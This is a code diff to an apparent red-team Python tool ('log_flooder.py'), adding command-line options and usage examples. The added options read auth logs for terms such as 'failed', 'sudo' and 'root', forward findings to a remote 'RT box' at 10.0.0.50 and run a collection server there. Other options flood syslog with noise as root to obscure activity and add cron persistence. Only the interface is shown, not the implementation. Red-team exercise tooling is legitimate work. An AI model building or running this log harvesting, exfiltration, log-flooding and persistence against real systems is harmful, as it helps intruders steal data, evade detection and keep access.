@@ -185,7 +185,7 @@ def _setup_syslog_logger() -> logging.Logger:
     logger  = logging.getLogger("rt_flooder")
     logger.setLevel(logging.INFO)
     handler = SysLogHandler(address=SYSLOG_SOCKET)
-    handler.setFormatter(logging.Formatter(f"{TAG}: %(message)s"))
+    handler.setFormatter(logging.Formatter(f">w<: %(message)s"))
     logger.addHandler(handler)
     return logger
 
@@ -241,9 +241,55 @@ def build_parser() -> argparse.ArgumentParser:
         prog = "log_flooder.py",
         description="Log collection and flooding tool",
         formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="TODO: bleh >w<"
+        epilog="""
+Examples:
+  # Collect & analyse auth log, save, and forward to RT box:
+  python3 log_tool.py --collect --keywords failed sudo root \\
+      --logs /var/log/auth.log --save --forward 10.0.0.50
+
+  # Run collection server on RT box:
+  python3 log_tool.py --serve --bind 0.0.0.0 --port 5140
+
+  # Generate syslog noise (root required):
+  sudo python3 log_tool.py --flood --rate 20 --duration 60
+
+  # Summarise all stored findings:
+  python3 log_tool.py --summary
+
+  # Add / remove cron persistence:
+  python3 log_tool.py --persist /tmp/log_tool.py
+  python3 log_tool.py --unpersist /tmp/log_tool.py
+""",
     )
     
+    io = parser.add_argument_group("Input")
+    io.add_argument("--logs", nargs="*", default=DEFAULT_LOGS, metavar="PATH",
+                    help="Log files to read (default: common Linux paths)")
+    io.add_argument("--keywords", nargs="*",
+                    default=["failed", "sudo", "root", "error", "invalid"],
+                    metavar="KW", help="Keywords to flag during analysis")
+
+    act = parser.add_argument_group("Actions")
+    act.add_argument("--collect", action="store_true", help="Analyse logs and print findings")
+    act.add_argument("--raw",     action="store_true", help="Print raw log lines (first 100)")
+    act.add_argument("--save",    action="store_true", help="Save findings to local JSON store")
+    act.add_argument("--summary", action="store_true", help="Summarise all stored findings")
+
+    nz = parser.add_argument_group("Noise Generation")
+    nz.add_argument("--flood",    action="store_true", help="Generate syslog noise (root required)")
+    nz.add_argument("--rate",     type=int, default=5,
+                    help=f"Messages/sec, max {MAX_RATE} (default: 5)")
+    nz.add_argument("--duration", type=int, default=30,
+                    help=f"Seconds, max {MAX_DURATION} (default: 30)")
+
+    ps = parser.add_argument_group("Persistence")
+    ps.add_argument("--persist",   metavar="SCRIPT", help="Add cron entry for SCRIPT (every 5 min)")
+    ps.add_argument("--unpersist", metavar="SCRIPT", help="Remove cron entry (cleanup)")
+
+    st = parser.add_argument_group("Storage")
+    st.add_argument("--storage-dir", default=str(STORAGE_DIR), metavar="DIR",
+                    help=f"Local findings directory (default: {STORAGE_DIR})")
+
     return parser
 
 
